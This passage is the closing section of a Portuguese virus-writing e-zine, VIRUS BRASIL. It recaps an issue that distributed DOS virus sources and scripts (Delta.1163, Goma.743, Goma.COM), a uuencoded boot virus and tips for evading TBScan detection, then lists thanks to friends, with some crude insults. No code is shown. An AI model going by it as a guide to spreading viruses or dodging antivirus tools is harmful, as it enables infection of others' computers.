   de programacao) pudessem compilar os fontes apresentados sem ter o com-
   pilador , hoje creio que esse problema nao existe , mas em todo caso ,
   foi ai .



ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            __          ___   
                     |  /  |__|  |     |__   |   |
                     |/    |  |  |___  |___  |___|   
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 
   10 - Valeu ...
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 

       Ae galera , espero que tenham gostado do zine VIRUS BRASIL .

       Nessa parte do zine , darei uma retrospectiva sobre os assuntos que 
  abordamos ao longo do zine , farei algums agradecimentos e mais o que eu
  julgar necessario.

        Assuntos abordados nessa edicao :

        - Como se defender das flags do tbscan 
        - UUencode e UUdecode (fontes) e virus de boot uuencodado

          Brasil
          ÄÄÄÄÄÄ
                
                Boot virus

        - Como manusear virus com seguranca
        - e Virus e' logico !!! ( 4 no total )
          2 Scripts ( para serem "compilados" com debuguer ) 
          2 Fontes e 1 UUencode

          Delta.1163 
          ÄÄÄÄÄÄÄÄÄÄ

                Infecta Com / Exe , TSR , Encriptado 

          Goma.COM
          ÄÄÄÄÄÄÄÄ

        - Virus fontes 

          Goma.743
          ÄÄÄÄÄÄÄÄ

               Infecta Com / Exe e' um virus de appending mas ta com ums
          bug e funciona como overwriting.

          Goma.COM
          ÄÄÄÄÄÄÄÄ

               Infecta Com . 100 % Novo !!!!

        - Todos os virus dessa edicao do zine sao nacionais e acho que 
        continuara sendo assim por muitas e muitas edicoes do zine ...


       Agradecimentos:
       ***************

        *****  `A Turma Da Goma como um todo . 

            ...   Goma para sempre seu bando de cururu   ...

         Turma da Goma  :

                Allan , Bozo (Daniel) , Daniel , Doido (Claudio) , 
       Du (Eduardo) , Guino (Welton (In Memoriam)) , Harry (Flavio) , 
       Henrique , Japones (Marcelo) , Jeca (Aldo) , Regis (In Memoriam) , 
       Ricardo , Str (Everson) , Eu e o Willian .


         ***** 
         
         Ao Lele'(Alexandre) , ao Pedro , ao Thyago , ao Ze' (do Belem), 
         ao Allan (Mutante) , ao Dark-Dream (Denis) , ao Moura (Gabriel) ,
         ao MMI (Marcelo) , ao Alevirus (Jose) , ao Z(Luciano) , ao Fred ,
         ao Lipe (Luiz),aos boy's (Marcelo, Rodrigo e Tadashi) e a toda 
         galera da facu (EQ 98 unicamp) 

         *****

         Pras minas 

                Rita, Patricias (Todas filhas de umas putas) , Fernanda ,
         Viviam , Elisangela ( mae do Regis (filho do Regis)) , Juliana ,
         e pra minha namorada (Daniele) .
                Pra toda mulherada la da facu tambem ( 6 tao ligada que sao
         e sao muitas ... )

         *****

                E pro Turco Loco (que faz minhas roupas !!!)


        Bom como esse ser o primeiro numero , nao recebi e-mails , carta
        bomba , intimacao ou qualquer outra manifestacao que deva ser men-
        cionada .

        Espero realmente que tenham gostado do zine , peco a voce leitor
        que de a sua opiniao sobre o zine , o que ta uma bosta , o que ta
        pessimo , o que ficou mais ou menos e ate' sobre o que ficou legal
        ou quase bom , sua critica ( seja ela de boa indole (construtiva)
        ou descendo o cacete em cima do zine ) e' muito importante para
        melhorarmos os aspectos do zine , seja no visual ou no conteudo ,
        meu e-mail e' esse aqui anota ai , e' vai ser o mesmo do zine
        (por enquanto) , anota ai :

        nim_bus@hotmail.com

        Quanto a Home Page nem tenho oh , por mais podre que fosse , iria
        levar algumas horas da minha vida e ja as utilizei com a elabora-
        cao desse zine .

        Em relacao `a erros de portugues (grafia , acentuacao , hifem , e
        o caraio a 4 ) , me desculpe , mas o zine inteiro foi sem acentua-
        cao grafica , com um so' corretor ( que sou eu , que alias tambem
        escrevi , e corrigir algo que voce mesmo escreve e' muito foda ) ,
        portanto , e' obvio que erros ocorreram e passaram batido , sempre
        que possivel durante sua leitura , os corrija , para que futuros
        leitores , nao sofram tanto para "traduzir" o zine.

        Quanto `a virus de macro to meio que no vai num vai , sei la 
        depende do que a galera que vai ler o zine decidir se quizer
        a gente da um jeito e descola alguma coisa sobre , se nao sei 
        la , mais pra frente agente da uma enfase a esse tipo de 
        virus.

******************************************************************************
          Use sempre camisinha, o  HIV e' um virus que nao sabe brincar 
******************************************************************************

         Ficamos por aqui , espero receber alguns e-mails da galera e
         a gente se ve ...
                                                
                                                                           EOZ
